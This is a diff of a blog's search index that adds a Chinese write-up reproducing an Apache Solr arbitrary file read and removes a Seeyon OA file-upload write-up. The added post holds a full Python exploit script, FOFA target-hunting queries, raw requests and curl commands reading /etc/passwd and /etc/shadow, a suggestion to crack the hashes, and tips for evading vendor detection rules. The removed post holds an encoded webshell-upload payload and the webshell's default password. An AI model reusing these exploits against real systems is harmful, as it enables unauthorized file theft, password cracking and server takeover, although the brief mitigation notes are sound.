@@ -92,6 +92,173 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
       </tags>
   </entry>
   <entry>
+    <title>Apache Solr任意文件读取漏洞复现</title>
+    <url>/2021/05/05/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Solr&quot; || app&#x3D;&quot;&quot;Apache-Solr&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Solr 全版本存在任意文件读取漏洞，攻击者可以在未授权的情况下获取目标系统的敏感文件。</p>
+<p>我综合了网上的两种漏洞利用，写了一篇比较详尽的文章。</p>
+<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Apache Solr 全版本</p>
+<h3 id="漏洞POC"><a href="#漏洞POC" class="headerlink" title="漏洞POC"></a>漏洞POC</h3><p>感谢PeiQi师傅，yyds！</p>
+<pre class="line-numbers language-none"><code class="language-none"># coding&#x3D;utf-8
+# Apache Solr 全版本任意文件读取
+# Fofa：app&#x3D;&quot;Apache-Solr&quot; || app&#x3D;&quot;Solr&quot;
+
+import requests
+import json
+import sys
+import time
+
+def title():
+    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
+    print(&quot;+～～～～～～ Apache Solr 全版本任意文件读取 ～～～～～～+&quot;)
+    print(&quot;+～～～～～～     Use: python3 solr.py     ～～～～～～+&quot;)
+    print(&quot;+～～～～～～   url: http:&#x2F;&#x2F;x.x.x.x:port   ～～～～～～+&quot;)
+    print(&quot;+～～～～～～～～～～～～～～～～～～～～～～～～～～～～～+&quot;)
+    time.sleep(2)
+
+def get_name(url):
+    url_1 &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;
+    try:
+        res &#x3D; requests.get(url&#x3D;url_1)
+        #将json数据python字典话
+        name &#x3D; str(list(json.loads(res.text)[&quot;status&quot;])[0])
+        print(&quot;[!]  获取到目标系统name:\033[31m%s\033[0m&quot;%name+&quot;  [0]&quot;+&quot;URL:&quot;+url+&quot;&#x2F;solr&#x2F;&quot;+name+&quot;&#x2F;config&quot;)
+        return name
+    except Exception as e:
+        print(&quot;[!]  目标URL无法进行利用。&quot;,e)
+        sys.exit(0)
+
+def check_vul(url,name):
+    url_2 &#x3D; url +&quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;config&quot;
+    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;
+
+    try:
+        res &#x3D; requests.post(url&#x3D;url_2,data&#x3D;data)
+        if &quot;This response format&quot; in res.text and res.status_code &#x3D;&#x3D; 200:
+            print(&quot;[!]  \033[31m目标系统存在漏洞\033[0m&quot;)
+        else:
+            print(&quot;[!]  目标系统不存在漏洞&quot;)
+            sys.exit(0)
+    except Exception as e:
+        print(&quot;[!]  目标系统请求失败。&quot;)
+        sys.exit(0)
+
+def read_files(url,name,file_name):
+    url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; + name + &quot;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;
+    # 此处必须要加content-type,否则读取不到文件
+    headers &#x3D; &#123;
+        &quot;Content-Type&quot; : &quot;application&#x2F;x-www-form-urlencoded&quot;
+    &#125;
+    data &#x3D; &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&quot;.format(file_name)
+
+    try:
+        res &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;data)
+        if &quot;No such file or directory&quot; in res.text:
+            print(&quot;[!] 目标系统读取文件失败！&quot;)
+            sys.exit(0)
+        else:
+            print(&quot;正在读取文件..........&quot;)
+            content &#x3D; (json.loads(res.text)[&quot;streams&quot;][0][&quot;stream&quot;])
+            print(&quot;[o] 读取文件内容为：\n\033[34m&#123;&#125;\033\0m&quot;.format(content))
+    except Exception as e:
+        print(&quot;[!]  目标系统似乎意外中断了&quot;,e)
+        sys.exit(0)
+
+if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
+    title()
+    url &#x3D; str(input(&quot;\n[!]  请输入目标系统URL: &quot;))
+    name &#x3D; get_name(url)
+    check_vul(url,name)
+    file_name &#x3D; str(input(&quot;[!]  请输入要读取的文件：&quot;))
+    read_files(url,name,file_name)
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>复现环境使用了Apache Solr 8.8.1版本，搭建在kali2021虚拟机上<br><a href="https://archive.apache.org/dist/lucene/solr/8.8.1/">https://archive.apache.org/dist/lucene/solr/8.8.1/</a><br><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png" alt="图片"><br>解压后，进入bin目录执行启动命令</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr strat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png" alt="图片"><br>访问url,出现如下页面即为启动成功<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/14.png" alt="图片"><br>此时启动的solr是没有核心进行索引和搜索的，这里需要创建一个数据驱动模式的核心</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;solr create -c [name]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png" alt="图片"></p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="Exploit①"><a href="#Exploit①" class="headerlink" title="Exploit①"></a>Exploit①</h4><p>访问url</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png" alt="图片"><br>burp数据包为</p>
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko&#x2F;20100101 Firefox&#x2F;88.0
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8
+Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age&#x3D;0
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png" alt="图片"><br>再使用burp进行POST请求</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;config HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 82
+
+&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/6.png" alt="图片"><br>当出现”This response format is experimental.  It is likely to change in the future.” 表示存在漏洞。</p>
+<p>进行文件读取</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 35
+Content-Type: application&#x2F;x-www-form-urlencoded
+
+stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/7.png" alt="图片"><br>也可以读取shadow文件然后进行john爆破出密码</p>
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1
+Host: 192.168.xxx.xxx:8983
+Cache-Control: max-age&#x3D;0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36
+Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q&#x3D;0.9
+Connection: close
+Content-Length: 35
+Content-Type: application&#x2F;x-www-form-urlencoded
+
+stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;shadow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8.png" alt="图片"></p>
+<h4 id="Exploit②"><a href="#Exploit②" class="headerlink" title="Exploit②"></a>Exploit②</h4><pre class="line-numbers language-none"><code class="language-none">curl -d &#39;&#123;  &quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39; http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;config -H &#39;Content-type:application&#x2F;json&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png" alt="图片"></p>
+<pre class="line-numbers language-none"><code class="language-none">curl &quot;http:&#x2F;&#x2F;192.168.xxx.xxx:8983&#x2F;solr&#x2F;test&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot; -F &quot;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;&#x2F;root&#x2F;a.txt&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>可以读取被攻击的主机文件<br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/12.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13.png" alt="图片"></p>
+<h4 id="Exploit-POC"><a href="#Exploit-POC" class="headerlink" title="Exploit_POC"></a>Exploit_POC</h4><p><a href="https://github.com/Henry4E36/Solr">https://github.com/Henry4E36/Solr</a><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/10.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/9.png" alt="图片"><br><img src="/images/ApacheSolr%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/15.png" alt="图片"></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>由于目前官方不予修复该漏洞，暂无安全版本。</p>
+<ol>
+<li>开启身份验证/授权</li>
+<li>配置防火墙策略，确保Solr API（包括Admin UI）只有受信任的IP和用户才能访问</li>
+<li>禁止将Apache Solr放置在外网</li>
+</ol>
+<h3 id="厂商防护及绕过思路"><a href="#厂商防护及绕过思路" class="headerlink" title="厂商防护及绕过思路"></a>厂商防护及绕过思路</h3><p>这种组件直接放内网就好了，或者一定配置身份校验，且Solr路由写的比较死，厂商提取规则时只要将url过滤完整即可，不会存在绕过情况。</p>
+<p>绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，core的名称包含在url中，且生产环境中为用户自定义，很多规则编写者通常只将示例example加入检测，可绕过几率很高。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ">https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ</a><br><a href="https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg">https://mp.weixin.qq.com/s/iX2OasjynZ0MAvNTvIcmjg</a><br><a href="https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw">https://mp.weixin.qq.com/s/O2-rkmfkuXNr-xSLwfeQlw</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>2021.1.3</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>【CVE-2021-23132】Joomla!目录遍历及远程代码执行漏洞复现</title>
     <url>/2021/03/18/Joomla!CVE-2021-23132%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><pre class="line-numbers language-none"><code class="language-none">app&#x3D;&quot;Joomla&quot;
@@ -656,50 +823,6 @@ int main(int argc, char *argv[])
       </tags>
   </entry>
   <entry>
-    <title>致远OA-ajax.do任意文件上传漏洞复现</title>
-    <url>/2021/01/22/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>致远OA是一套办公协同管理软件。近日，奇安信CERT监测到致远OA的相关漏洞信息。由于致远OA旧版本某些接口存在未授权访问，以及部分函数存在过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本文件，从而控制服务器。致远OA官方已针对该漏洞提供补丁。鉴于漏洞危害较大，建议用户尽快应用补丁更新。</p>
-<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>致远OA V8.0<br>致远OA V7.1、V7.1SP1<br>致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3<br>致远OA V6.0、V6.1SP1、V6.1SP2<br>致远OA V5.x<br>致远OA G6</p>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>访问thirdpartyController.do.css/..;/ajax.do，判断是否存在漏洞</p>
-<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;seeyon&#x2F;thirdpartyController.do.css&#x2F;..;&#x2F;ajax.do<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>出现异常：java.lang.NullPointerException:null<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1.png" alt="图片"><br>使用工具生成payload，我使用的PoC如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;seeyon&#x2F;autoinstall.do.css&#x2F;..;&#x2F;ajax.do?method&#x3D;ajaxAction&amp;managerName&#x3D;formulaManager&amp;requestCompress&#x3D;gzip HTTP&#x2F;1.1
-Host: 127.0.0.1
-Connection: close
-Cache-Control: max-age&#x3D;0
-Upgrade-Insecure-Requests: 1
-User-Agent: Opera&#x2F;9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto&#x2F;2.9.168 Version&#x2F;11.52
-Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9
-Sec-Fetch-Site: none
-Sec-Fetch-Mode: navigate
-Sec-Fetch-User: ?1
-Sec-Fetch-Dest: document
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q&#x3D;0.9
-Cookie: JSESSIONID&#x3D;7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL&#x3D;; login_locale&#x3D;zh_CN;
-Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 8819
-
-managerMethod&#x3D;validate&amp;arguments&#x3D;%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>使用burpsuite上传EXP，漏洞利用成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.png" alt="图片"><br>利用失败会返回如下：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#123;
-&quot;message&quot;:&quot;被迫下线，原因：与服务器失去连接&quot;,
-&quot;code&quot;:&quot;-1&quot;,
-&quot;details&quot;:null
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>请求webshell,证明上传成功<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/3.png" alt="图片"><br>使用冰蝎3进行连接，连接成功<br>Webshell地址:<a href="http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx">http://xxx.xxx.xxx.xxx/seeyon/SeeyonUpdate1.jspx</a><br>冰蝎3 默认马pass：rebeyond<br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/4.png" alt="图片"><br><img src="/images/%E8%87%B4%E8%BF%9COA-ajax.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/5.png" alt="图片"></p>
-<p>冰蝎下载链接：<a href="https://github.com/rebeyond/Behinder/releases">https://github.com/rebeyond/Behinder/releases</a></p>
